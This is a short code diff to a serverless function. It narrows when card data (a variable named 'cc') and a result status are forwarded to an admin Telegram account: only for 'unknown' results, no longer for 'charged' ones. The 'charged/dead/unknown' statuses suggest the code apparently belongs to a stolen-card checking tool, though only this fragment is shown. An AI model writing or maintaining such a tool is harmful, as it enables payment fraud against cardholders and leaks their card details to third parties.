@@ -258,8 +258,8 @@ serve(async (req) => {
     // Wait for API result
     const result = await apiPromise;
     
-    // Send debug to admin Telegram only for CHARGED and UNKNOWN (not DEAD)
-    if (result.status === 'charged' || result.status === 'unknown') {
+    // Send debug to admin Telegram only for UNKNOWN (not DEAD or CHARGED)
+    if (result.status === 'unknown') {
       sendAdminDebug(
         cc,
         result.status,
